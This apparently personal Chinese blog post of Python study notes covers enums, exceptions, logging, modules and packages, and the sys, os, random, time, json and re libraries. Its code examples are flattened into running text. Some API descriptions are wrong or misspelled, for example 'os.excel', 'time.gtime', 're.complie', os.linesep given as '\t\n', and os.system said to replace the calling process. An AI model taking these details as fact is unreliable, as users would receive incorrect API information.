除了通过继承 Enum 类的方法创建枚举类，还可以使用 Enum() 函数创建枚举类。例如： 12345678910111213from enum import Enum#创建一个枚举类Color = Enum(&quot;Color&quot;,('red','green','blue'))#调用枚举成员的 3 种方式print(Color.red)print(Color['red'])print(Color(1))#调取枚举成员中的 value 和 nameprint(Color.red.value)print(Color.red.name)#遍历枚举类中所有成员的 2 种方式for color in Color: print(color) Enum() 函数可接受 2 个参数，第一个用于指定枚举类的类名，第二个参数用于指定枚举类中的多个成员。 如上所示，仅通过一行代码，即创建了一个和前面的 Color 类相同的枚举类。运行程序，其输出结果为： Color.redColor.redColor.red1redColor.redColor.greenColor.blue 异常处理异常概述…… 异常处理机制使用try…except捕获异常…… 异常类的继承体系异常捕获时所有的父类异常的except块都应该排在子类异常的except后面 即：先处理小异常，再处理大异常 https://www.cnblogs.com/liujiacai/p/10280323.html 总结： BaseException 是所有异常类的基类，如果不清楚是那种异常，需要捕获所有异常，则直接使用 BaseException 捕获。其他所有异常仅仅是对基础异常的细化和分类 多异常捕获构建多个异常类的元组 访问异常信息 args：返回异常的错误编号和描述字符串 errno：返回异常的错误编号 strerror：返回异常的描述字符串 with_traceback()：处理异常的传播轨迹信息 12345678def foo(): try: file = open(&quot;a.txt&quot;); except Exception as e: print(e.args) print(e.errno) print(e.strerror)foo() else模块当try块没有出现异常时，程序会执行else块 如果希望某段代码的异常能被后面的except块捕获，将这段代码放在try块中。否则，放else中 使用finally回收资源有时，程序在try中打开了一些物理资源（例如数据库连接、网络连接、磁盘文件等） finally总会执行 try块必须，except和finally必须存在一个 除非try块、except块中调用了退出python解释器的方法，否则finally始终执行 只有当finally块执行完之后，系统才会再次跳回来执行try块、except块里的raise或return语句，如果finally块里也使用了raise或return，程序将不再执行try或except 异常处理嵌套…… 记录异常如果不捕获错误，自然可以让Python解释器来打印出错误堆栈，但程序也被结束了。既然我们能捕获错误，就可以把错误堆栈打印出来，然后分析错误原因，同时，让程序继续执行下去。 Python内置的logging模块可以非常容易地记录错误信息： 123456789101112131415161718# err_logging.pyimport loggingdef foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar('0') except Exception as e: logging.exception(e)main()print('END') 同样是出错，但程序打印完错误信息后会继续执行，并正常退出： 1234567891011$ python3 err_logging.pyERROR:root:division by zeroTraceback (most recent call last): File &quot;err_logging.py&quot;, line 13, in main bar('0') File &quot;err_logging.py&quot;, line 9, in bar return foo(s) * 2 File &quot;err_logging.py&quot;, line 6, in foo return 10 / int(s)ZeroDivisionError: division by zeroEND 通过配置，logging还可以把错误记录到日志文件里，方便事后排查。 使用raise引发异常引发异常…… 自定义异常类1class AuctionException(Exception):pass except和raise同时使用 应用后台需要通过日志来记录异常发生的详细情况 应用还需要根据异常向应用使用者传达某种提示 1234567891011121314151617181920212223242526class AuctionException(Exception): passclass AuctionTest: def __init__(self, init_price): self.init_price = init_price def bid(self, bid_price): d = 0.0 try: d = float(bid_price) except Exception as e: # 此处只是简单地打印异常信息 print(&quot;转换出异常：&quot;, e) # 再次引发自定义异常# raise AuctionException(&quot;竞拍价必须是数值，不能包含其他字符！&quot;) # ①# raise AuctionException(e) raise if self.init_price &gt; d: raise AuctionException(&quot;竞拍价比起拍价低，不允许竞拍！&quot;) initPrice = ddef main(): at = AuctionTest(20.4) try: at.bid(&quot;df&quot;) except AuctionException as ae: # 再次捕获到bid()方法中的异常，并对该异常进行处理 print('main函数捕捉的异常：', ae)main() python的异常传播轨迹python专门提供了traceback模块来处理异常传播轨迹 traceback.print_exc()：将异常传播轨迹信息输出到控制台或指定文件 format_exc()：将异常传播轨迹信息转换成字符串 模块和包模块化编程导入模块的语法…… 定义模块…… 为模块编写说明文档…… 为模块编写测试代码…… 加载模块 使用环境变量 将模块放在默认的模块加载路径下 使用环境变量…… 默认的模块加载路径…… 导入模块的本质输出语句会在import时自动执行 import导入的本质：将模块中的所有代码加载到内存并执行，然后将整个模块内容赋值给与模块同名的变量，该变量的类型是module，而在该模块定义的所有程序单元都相当于该module对象的成员 from import导入本质：模块中全部代码加载到内存并执行，然后只导入指定变量、函数等成员单元，不会将整个模块导入 模块的__all__变量在默认情况下from import*会导入该模块中所有不以下划线开头的程序单元 __all__变量，将变量的值设置成一个列表，只有该列表中的程序单元才会被暴露出来 如果希望使用__all__列表之外的程序单元 import pprint pprint.pprint from pprint import pprint pprint不在pprint模块的all列表中 使用包定义包文件夹中存在__init.py__文件 导入包内成员12from . import print_shapefrom .print_shape import * 查看模块内容模块包含什么 dir() __all__ 查看文档 help() help函数查看的就是__doc__属性值 __doc__ 查看模块的源文件路径__file__属性 1string.__file__ 常见模块syssys模块是与python解释器交互的⼀个接口 123&gt;&gt;&gt; [e for e in dir(sys) if not e.startswith('_')]['addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dllhandle', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getwindowsversion', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'last_traceback', 'last_type', 'last_value', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'setcheckinterval', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions', 'winver'] sys.argv：获取运行python程序的命令行参数 sys.argv[0]指该python程序 sys.argv[1]代表为python程序提供的第一个参数 sys.byteorder：显示本地字节序的指示符，大端模式返回big，否则返回little sys.copyright：返回和python解释器有关的版权信息 sys.executable：返回python解释器在磁盘上的存储路径 sys.exit()：通过引发SystemExit异常来退出程序。将其放在try中不能阻止finally块的执行，正常退出时exit(0),错误退出sys.exit(1) os._exit(n)：可以放在try中，阻止finally块执行 sys.flags：该只读属性返回运行python命令时指定的旗标 sys.getfilesystemencoding()：返回在当前系统中保存文件所用的字符集 sys.getrefcount(object)：返回指定对象的引用次数。当object对象的引用次数为0时，系统会回收该对象 sys.getrecursionlimit()：返回python解释器当前支持的递归深度，可以通过setrecursionlimit()方法重新配置 sys.getswitchinterval()：返回在当前python解释器中线程切换的时间间隔，可以通过setswitchinterval()方法重新配置 sys.implementation：返回当前python解释器的实现 sys.maxsize：返回python整数支持的最大值 sys.modules：返回模块名和载入模块对应关系的字典 sys.path：该属性指定python查找模块的路径列表，可以通过修改动态增加 sys.append sys.platform：返回python解释器所在系统的标识符 sys.stdin：返回系统的标准输入流——一个类文件对象 sys.stdout：返回系统的标准输出流——一个类文件对象 sys.version：返回当前python解释器的版本信息 sys.winver：返回当前python解释器的主版本号 若某参数中有空格，应当用“ ”引出 os模块os模块是与操作系统交互的⼀个接⼝ 当前执行这个python⽂件的⼯作⽬录相关的⼯作路径 os.getcwd() 获取当前工作目录，即当前python脚本工作的目录路径 os.chdir(“dirname”) 改变当前脚本工作目录；相当于shell下cd os.curdir 返回当前目录: (‘.’) os.pardir 获取当前目录的父目录字符串名：(‘..’) 文件夹相关 os.makedirs(‘dirname1/dirname2’) 可生成多层递归目录 os.removedirs(‘dirname1’) 若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推 os.mkdir(‘dirname’) 生成单级目录；相当于shell中mkdir dirname os.rmdir(‘dirname’) 删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname os.listdir(‘dirname’) 列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印 文件相关 os.remove() 删除一个文件 os.rename(“oldname”,”newname”) 重命名文件/目录 os.stat(‘path/filename’) 获取文件/目录信息 操作系统差异相关 os.sep 输出操作系统特定的路径分隔符，win下为”&quot;,Linux下为”/“ os.linesep 输出当前平台使用的行终止符，win下为”\\t\\n”,Linux下为”\\n” os.pathsep 输出用于分割文件路径的字符串 win下为;,Linux下为: os.name 输出字符串指示当前使用平台。win-&gt;’nt’; Linux-&gt;’posix’ 执行系统命令相关 os.system(“bash command”) 运行shell命令，直接显示 os.popen(“bash command“).read() 运行shell命令，获取执行结果 os.environ 获取系统环境变量 进程管理相关 os.abort() 生成一个SIGABRT信号给当前进程 os.excel(path, arg0, arg1…) 使用参数来执行path代表的执行文件 os.forkpty() fork一个子进程 os.kill(pid, sig) 将sig信号发送到pid对应的进程，用于结束该进程 os.killpg(pgid, sig) 将sig信号发送到pgid对应的进程组 os.popen(cmd, mode=’r’, buffering=-1) 用于向cmd命令打开读写管道 os.spawnl(mode, path, …) 用于在新进程中执行新程序 os.startfile(path[, operation]) 对指定文件使用该文件关联的工具执行operation对应的操作 os.system(command) 运行操作系统上的指令命令，且新程序所在进程会替代原有进程，包括os.excel path系列，和路径相关 os.path.abspath(path) 返回path规范化的绝对路径 os.path.split(path) 将path分割成目录和文件名二元组返回 os.path.dirname(path) 返回path的目录。其实就是os.path.split(path)的第一个元素 os.path.basename(path) 返回path最后的文件名。如何path以／或\\结尾，那么就会返回空值，即os.path.split(path)的第二个元素。 os.path.exists(path) 如果path存在，返回True；如果path不存在，返回False os.path.isabs(path) 如果path是绝对路径，返回True os.path.isfile(path) 如果path是一个存在的文件，返回True。否则返回False os.path.isdir(path) 如果path是一个存在的目录，则返回True。否则返回False os.path.join(path1[, path2[, …]]) 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略 os.path.getatime(path) 返回path所指向的文件或者目录的最后访问时间 os.path.getmtime(path) 返回path所指向的文件或者目录的最后修改时间 os.path.getsize(path) 返回path的大小 os.fsencode(filename)：该函数对类路径(path-like)的文件名进行编码 os.fsdecode(filename)：该函数对类路径(path-like)的文件名进行解码 os.PathLike：这是一个类，代表一个类路径(path-like)对象 os.getenv(key, default=None)：获取指定环境变量的值 os.getlogin()：返回当前系统的登录用户名 os.getpid()：获取当前进程id os.getppid()：获取当前进程的父进程id os.putenv(key, value)：用于设置环境变量 os.cpu_count()：返回当前系统的CPU数量 os.urandom(size)：返回合适作为加密使用的、最多由N个字节组成的bytes对象 random12&gt;&gt;&gt; random.__all__['Random', 'seed', 'random', 'uniform', 'randint', 'choice', 'sample', 'randrange', 'shuffle', 'normalvariate', 'lognormvariate', 'expovariate', 'vonmisesvariate', 'gammavariate', 'triangular', 'gauss', 'betavariate', 'paretovariate', 'weibullvariate', 'getstate', 'setstate', 'getrandbits', 'choices', 'SystemRandom'] random.seed(a=None, version=2)：指定种子来初始化伪随机数生成器 random.randrange(start, stop[, step])：返回start到stop，步长为step的随机数，不生成区间对象，step&gt;stop则返回1，step=2为偶数，倍数 random.randint(a, b)：生成a&lt;=N&lt;=b的随机数，等同于random.randrange(a, b+1)的效果 random.choice(seq)：从seq中随机抽取一个元素，若seq为空，则引发IndexError异常 random.choices(seq, weights=None, *, cum_weights=None, k=1)：从seq序列中抽取k个元素，还可通过weights指定各元素的抽取权重 random.shuffle(x[, random])：对x序列重新随机排列 random.sample(population, k)：从population中随机抽取k个独立的元素 random.random()；生成一个从0.0(包含)到1.0(不包含)之间的伪随机浮点数 random.uniform(a, b)：生成a&lt;=N&lt;=b的随机数 random.expovariate(lambd)：生成呈指数分布的随机数 1random.choices(['python', 'swift', 'kotlin'], '5, 5, 1', k=6) time12&gt;&gt;&gt; [s for s in dir(time) if not s.startswith('_')]['altzone', 'asctime', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', 'monotonic', 'monotonic_ns', 'perf_counter', 'perf_counter_ns', 'process_time', 'process_time_ns', 'sleep', 'strftime', 'strptime', 'struct_time', 'thread_time', 'thread_time_ns', 'time', 'time_ns', 'timezone', 'tzname'] 结构化时间(struct_time) ：struct_time结构化时间共有9个元素:(年，月，日，时，分，秒，一年中第几周，一年中第几天等） 12&gt;&gt;&gt; dir(time.struct_time)['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index', 'n_fields', 'n_sequence_fields', 'n_unnamed_fields', 'tm_gmtoff', 'tm_hour', 'tm_isdst', 'tm_mday', 'tm_min', 'tm_mon', 'tm_sec', 'tm_wday', 'tm_yday', 'tm_year', 'tm_zone'] 索引（Index） 属性（Attribute） 值（Values） 0 tm_year（年） 比如2011 1 tm_mon（月） 1月12日 2 tm_mday（日） 1月31日 3 tm_hour（时） 0 - 23 4 tm_min（分） 0 - 59 5 tm_sec（秒） 0 - 60 6 tm_wday（weekday） 0 - 6（0表示周一） 7 tm_yday（一年中的第几天） 1 - 366 8 tm_isdst（是否是夏令时） 默认为0 time.struct_time(tm_year=2018,…) time.struct_time(2018, 5, 2, 8, 0, 30, 3, 1, 0) 时间元组 time.asctime([t])：将时间元组或struct_time转换为时间字符串，默认为当前时间 time.ctime([secs])：将以秒数为代表的时间转换为时间字符串 time.gtime([secs])：将以秒数为代表的时间转换为struct_time对象 time.localtime([secs])：将以秒数为代表的时间转换为当前struct_time对象 time.mktime(t)：localtime的反转函数 time.perf_counter()：返回性能计数器的值，秒为单位 time.process_time()：返回当前进程使用CPU的时间 time.sleep(secs)：暂停secs秒 time.strftime(format[, t])：将时间元组或struct_time对象格式化为指定格式的字符串 time.strptime(format[, t])：将字符串格式的时间解析成struct_time对象 time.time()：返回1970,1,1,0至今秒数 time.timezone：返回地区时间的偏移，秒为单位 time.tzname：返回本地时区名字 格式模板 %y 两位数的年份表示（00-99） %Y 四位数的年份表示（000-9999） %m 月份（01-12） %d 月内中的一天（0-31） %H 24小时制小时数（0-23） %I 12小时制小时数（01-12） %M 分钟数（00=59） %S 秒（00-59） %a 本地简化星期名称 %A 本地完整星期名称 %b 本地简化的月份名称 %B 本地完整的月份名称 %c 本地相应的日期表示和时间表示 %j 年内的一天（001-366） %p 本地A.M.或P.M.的等价符 %U 一年中的星期数（00-53）星期天为星期的开始 %w 星期（0-6），星期天为星期的开始 %W 一年中的星期数（00-53）星期一为星期的开始 %x 本地相应的日期表示 %X 本地相应的时间表示 %Z 当前时区的名称 %% %号本身 时间戳是计算机能够识别的时间；时间字符串是人能够看懂的时间；元组则是用来操作时间的 几种格式之间的转换 12345678910111213141516171819import time# 格式化时间 ----&gt; 结构化时间ft = time.strftime('%Y/%m/%d %H:%M:%S') # '2021/08/05 23:45:15'st = time.strptime(ft,'%Y/%m/%d %H:%M:%S')print(st)# time.struct_time(tm_year=2021, tm_mon=8, tm_mday=5, tm_hour=23, tm_min=45, tm_sec=15, tm_wday=3, tm_yday=217, tm_isdst=-1)# 结构化时间 ---&gt; 时间戳t = time.mktime(st)print(t) # 1628178315.0# 时间戳 ----&gt; 结构化时间t = time.time()st = time.localtime(t)print(st)# 结构化时间 ---&gt; 格式化时间ft = time.strftime('%Y/%m/%d %H:%M:%S',st)print(ft) 123456789import time#结构化时间 --&gt; %a %b %d %H:%M:%S %Y串#time.asctime(结构化时间) 如果不传参数，直接返回当前时间的格式化串print(time.asctime(time.localtime(1550312090.4021888)))#时间戳 --&gt; %a %d %d %H:%M:%S %Y串#time.ctime(时间戳) 如果不传参数，直接返回当前时间的格式化串print(time.ctime(1550312090.4021888)) JSON支持JSON的基本知识JSON主要有两种数据结构： key-value对组成的数据结构，python中对应dict对象 有序集合，python中对应列表 使用JSON语法创建对象123456789101112object = { propertyName1 : propertyValue1, propertyName2 : { propertyName1 : propertyValue1, propertyName2 : propertyValue2, propertyName3 : propertyValue3, propertyName4 : propertyValue4 }, propertyName3 : info(), propertyName4 : propertyValue4} 使用JSON语法创建数组1var a = ['yeeku', 'nono']; python的JSON支持python对象到json字符串的转换规则： Python JSON dict object list, tuple array str, unicode string int, long, float number True true False false None null 1234json.dump(obj, fp, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)# 将obj对象转换成JSON字符串输出到fp流中，fp是一个支持write()方法的类对象文件json.dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding=”utf-8”, default=None, sort_keys=False, **kw)# 将obj对象转换为JSON字符串，并返回该JSON字符串 json字符串到python对象的转换规则： JSON Python object dict array list string unicode number (int) int, long number (real) float true True false False null None 1234json.load()# 从fp流读取JSON字符串，将其恢复成JSON对象json.loads()# 将JSON字符串s恢复成JSON对象 正则表达式python的正则表达式12&gt;&gt;&gt; re.__all__['match', 'fullmatch', 'search', 'sub', 'subn', 'split', 'findall', 'finditer', 'compile', 'purge', 'template', 'escape', 'error', 'Pattern', 'Match', 'A', 'I', 'L', 'M', 'S', 'X', 'U', 'ASCII', 'IGNORECASE', 'LOCALE', 'MULTILINE', 'DOTALL', 'VERBOSE', 'UNICODE'] re.compile(pattern, flags=0)：该函数用于将正则表达式字符串编译成_sre.SRE_Pattern对象 re.match(pattern, string, flags=0)：尝试从字符串的开始位置来匹配正则表达式 re.search(pattern, string, flags=0)：扫描整个字符串，并返回字符串中第一处匹配pattern的匹配对象 re.findall(pattern, string, flags=0)：扫描整个字符串，并返回字符串中所有匹配pattern的子串组成的列表 re.finditer(pattern, string, flags=0)：扫描整个字符串，并返回字符串中所有匹配pattern的子串组成的迭代器 re.fullmatch(pattern, string, flags=0)：该函数要求整个字符串能匹配pattern re.sub(pattern, repl, string, count=0, flags=0)：用于将string中匹配pattern的替换成repl，count为最多替换多少次，0为全部 re.split(pattern, string, maxsplit=0, flags=0)：使用pattern对string进行分割，该函数返回分割得到的多个子串组成的列表 re.purge()：清楚正则表达式缓存 re.escape(pattern)：对模式中除ASCII字符、数值、下划线之外的字符进行转义,添加\\ 将正则表达式编译成一个pattern对象 1re.complie(&quot;正则表达式&quot;) pattern提供一系列的方法，来对文本进行匹配，一般返回一个match对象 通过使用match对象提供的方法来获取匹配结果 12345678910111213141516match.group() #获取该匹配对象中指定组所匹配的字符串match.__getitem__(g) # match.group(g)的简化写法 match[g]代替match.group(g)match.group(0)#获取匹配结果，结果同上match.groups() # 所匹配的字符串组成的元组match.groupdict() # 组成的字典match.span() #获取匹配范围，开始到结束match.start() #匹配开始位置match.end() #匹配结束位置# ?p&lt;名字&gt; 为正则表达式的组指定的名字match.pos：返回传给正则表达式的pos参数match.endpos：返回传给正则表达式的endpos参数match.lastindex：返回最后一个匹配的捕获组的整数索引match.lastgroup：返回最后一个匹配的捕获组的名字match.re：返回执行正则表达式匹配时所用的正则表达式match.string：返回执行正则表达式匹配时所用的字符串 正则表达式旗标 re.A：控制\\w \\W \\b \\B \\d \\D \\s \\S只匹配ASCII字符而不匹配所有的Unicode字符，可在正则表达式中使用?a行内旗标表示 re.DEBUG：显示编译正则表达式的Debug信息，无行内旗标 re.I或re.IGNORECASE：匹配时不区分大小写 ?i re.S：点(.)可以匹配包括换行符在内所有字符 re.X：允许分行书写正则表达式 创建正则表达式 元字符 匹配内容 \\w 匹配字母（包含中文）或数字或下划线 \\W 匹配非字母（包含中文）或数字或下划线 \\s 匹配任意的空白符 \\S 匹配任意非空白符 \\d 匹配数字 \\D 匹配非数字 \\A 从字符串开头匹配 \\z 匹配字符串的结束，如果是换行，只匹配到换行前的结果 \\n 匹配一个换行符 \\t 匹配一个制表符 ^ 匹配字符串的开始 $ 匹配字符串的结尾 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 匹配字符组中的字符 [^…] 匹配除了字符组中的字符的所有字符 * 匹配0个或者多个左边的字符。 + 匹配一个或者多个左边的字符。 ？ 匹配0个或者1个左边的字符，非贪婪方式。 {n} 精准匹配n个前面的表达式。 {n,m} 匹配n到m次由前面的正则表达式定义的片段，贪婪方式 () 匹配括号内的表达式，也表示一个组 单字符匹配： 1234567891011121314151617181920import reprint(re.findall('\\w','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\W','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\s','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\S','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\d','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\D','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\A上大','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('^上大','上大人123asdfg%^&amp;*(_ \\t \\n)'))# print(re.findall('666\\z','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('666\\Z','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('666$','上大人123asdfg%^&amp;*(_ \\t \\n)666'))print(re.findall('\\n','上大人123asdfg%^&amp;*(_ \\t \\n)'))print(re.findall('\\t','上大人123asdfg%^&amp;*(_ \\t \\n)')) 1234567891011121314['上', '大', '人', '1', '2', '3', 'a', 's', 'd', 'f', 'g', '_']['%', '^', '&amp;', '*', '(', ' ', '\\t', ' ', '\\n', ')'][' ', '\\t', ' ', '\\n']['上', '大', '人', '1', '2', '3', 'a', 's', 'd', 'f', 'g', '%', '^', '&amp;', '*', '(', '_', ')']['1', '2', '3']['上', '大', '人', 'a', 's', 'd', 'f', 'g', '%', '^', '&amp;', '*', '(', '_', ' ', '\\t', ' ', '\\n', ')']['上大']['上大']['666']['666']['\\n']['\\t']Process finished with exit code 0 重复匹配： 12345678910111213141516171819202122232425262728293031323334353637383940import reprint(re.findall('a.b', 'ab aab a*b a2b a牛b a\\nb'))print(re.findall('a.b', 'ab aab a*b a2b a牛b a\\nb',re.DOTALL))print(re.findall('a?b', 'ab aab abb aaaab a牛b aba**b'))print(re.findall('a*b', 'ab aab aaab abbb'))print(re.findall('ab*', 'ab aab aaab abbbbb'))print(re.findall('a+b', 'ab aab aaab abbb'))print(re.findall('a{2,4}b', 'ab aab aaab aaaaabb'))print(re.findall('a.*b', 'ab aab a*()b'))print(re.findall('a.*?b', 'ab a1b a*()b, aaaaaab'))# .*? 此时的?不是对左边的字符进行0次或者1次的匹配,# 而只是针对.*这种贪婪匹配的模式进行一种限定:告知他要遵从非贪婪匹配 推荐使用!# []: 括号中可以放任意一个字符,一个中括号代表一个字符# - 在[]中表示范围,如果想要匹配上- 那么这个-符号不能放在中间.# ^ 在[]中表示取反的意思.print(re.findall('a.b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[abc]b', 'aab abb acb adb afb a_b'))print(re.findall('a[0-9]b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[a-z]b', 'a1b a3b aeb a*b arb a_b'))print(re.findall('a[a-zA-Z]b', 'aAb aWb aeb a*b arb a_b'))print(re.findall('a[0-9][0-9]b', 'a11b a12b a34b a*b arb a_b'))print(re.findall('a[*-+]b','a-b a*b a+b a/b a6b'))print(re.findall('a[-*+]b','a-b a*b a+b a/b a6b'))print(re.findall('a[^a-z]b', 'acb adb a3b a*b'))# 分组：() 制定一个规则,将满足规则的结果匹配出来print(re.findall('(.*?)_666', 'cs_666 zhao_888 叶良辰_666'))print(re.findall('href=&quot;(.*?)&quot;','&lt;a href=&quot;http://www.baidu.com&quot;&gt;点击&lt;/a&gt;'))print(re.findall('compan(y|ies)','Too many companies have gone bankrupt, and the next one is my company'))print(re.findall('compan(?:y|ies)','Too many companies have gone bankrupt, and the next one is my company'))# 分组() 中加入?: 表示将整体匹配出来而不只是()里面的内容 123456789101112131415161718192021222324['aab', 'a*b', 'a2b', 'a牛b']['aab', 'a*b', 'a2b', 'a牛b', 'a\\nb']['ab', 'ab', 'ab', 'b', 'ab', 'b', 'ab', 'b']['ab', 'aab', 'aaab', 'ab', 'b', 'b']['ab', 'a', 'ab', 'a', 'a', 'ab', 'abbbbb']['ab', 'aab', 'aaab', 'ab']['aab', 'aaab', 'aaaab']['ab aab a*()b']['ab', 'a1b', 'a*()b', 'aaaaaab']['a1b', 'a3b', 'aeb', 'a*b', 'arb', 'a_b']['aab', 'abb', 'acb']['a1b', 'a3b']['aeb', 'arb']['aAb', 'aWb', 'aeb', 'arb']['a11b', 'a12b', 'a34b']['a*b', 'a+b']['a-b', 'a*b', 'a+b']['a3b', 'a*b']['cs', ' zhao_888 叶良辰']['http://www.baidu.com']['ies', 'y']['companies', 'company']Process finished with exit code 0 常用方法举例： 1234567891011121314151617181920212223242526272829import re# findall 全部找到返回一个列表print(re.findall('a','aghjmnbghagjmnbafgv'))# search 只到找到第一个匹配然后返回一个包含匹配信息的对象,该对象可以通过调用group()方法得到匹配的字符串,如果字符串没有匹配，则返回Noneprint(re.search('sg|chensong', 'chensong sg sg demon xwz'))print(re.search('chensong', 'chensong sg sg barry xwzz').group())# match：None,同search,不过在字符串开始处进行匹配,完全可以用search+^代替matchprint(re.match('sg|chensong', 'chensong sg sg demon xwz'))print(re.match('chensong', 'chensong sg sg barry xwz').group())# split 分割 可按照任意分割符进行分割print(re.split('[:：,;；，]','1;3,c,a：3'))# sub 替换print(re.sub('帅哥','sg','陈松是一个帅哥'))# complie 根据包含的正则表达式的字符串创建模式对象。可以实现更有效率的匹配。obj = re.compile('\\d{2}')print(obj.search('abc123eeee').group())print(obj.findall('1231232aasd'))ret = re.finditer('\\d','asd123affess32432') # finditer返回一个存放匹配结果的迭代器print(ret)print(next(ret).group())print(next(ret).group())print([i.group() for i in ret]) findall：有多少找多少 search：只找一个 match：只找一个，且在开头 123456789101112131415['a', 'a', 'a']&lt;re.Match object; span=(0, 8), match='chensong'&gt;chensong&lt;re.Match object; span=(0, 8), match='chensong'&gt;chensong['1', '3', 'c', 'a', '3']陈松是一个sg12['12', '31', '23']&lt;callable_iterator object at 0x000001B021814488&gt;12['3', '3', '2', '4', '3', '2']Process finished with exit code 0 命名分组举例 命名分组匹配 1234567891011import reret = re.search(&quot;&lt;(?P&lt;tag_name&gt;\\w+)&gt;\\w+&lt;/(?P=tag_name)&gt;&quot;,&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;)print(ret.group('tag_name'))print(ret.group())ret = re.search(r&quot;&lt;(\\w+)&gt;\\w+&lt;/\\1&gt;&quot;,&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;)# 如果不给组起名字，也可以用\\序号来找到对应的组，表示要找的内容和前面的组内容一致# 获取的匹配结果可以直接用group(序号)拿到对应的值print(ret.group(1))print(ret.group()) 容器相关类set和frozensetset: 不记录元素的添加位置 元素不允许重复 frozenset: 是set的不可变版本","link":"/2021/08/01/python%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"技巧","slug":"技巧","link":"/tags/%E6%8A%80%E5%B7%A7/"},{"name":"转载","slug":"转载","link":"/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"小技巧","slug":"小技巧","link":"/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"name":"自制操作系统","slug":"自制操作系统","link":"/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"教程","slug":"教程","link":"/tags/%E6%95%99%E7%A8%8B/"},{"name":"数据分析","slug":"数据分析","link":"/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"name":"数据挖掘","slug":"数据挖掘","link":"/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"},{"name":"机器学习","slug":"机器学习","link":"/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Hadoop","slug":"Hadoop","link":"/tags/Hadoop/"},{"name":"配置","slug":"配置","link":"/tags/%E9%85%8D%E7%BD%AE/"},{"name":"测试","slug":"测试","link":"/tags/%E6%B5%8B%E8%AF%95/"},{"name":"APP测试","slug":"APP测试","link":"/tags/APP%E6%B5%8B%E8%AF%95/"},{"name":"FTP","slug":"FTP","link":"/tags/FTP/"},{"name":"ECS","slug":"ECS","link":"/tags/ECS/"},{"name":"深度学习","slug":"深度学习","link":"/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"前馈神经网络","slug":"前馈神经网络","link":"/tags/%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"华为认证","slug":"华为认证","link":"/tags/%E5%8D%8E%E4%B8%BA%E8%AE%A4%E8%AF%81/"},{"name":"RS","slug":"RS","link":"/tags/RS/"},{"name":"网络安全","slug":"网络安全","link":"/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"入门","slug":"入门","link":"/tags/%E5%85%A5%E9%97%A8/"},{"name":"LaTeX","slug":"LaTeX","link":"/tags/LaTeX/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"},{"name":"企业服务","slug":"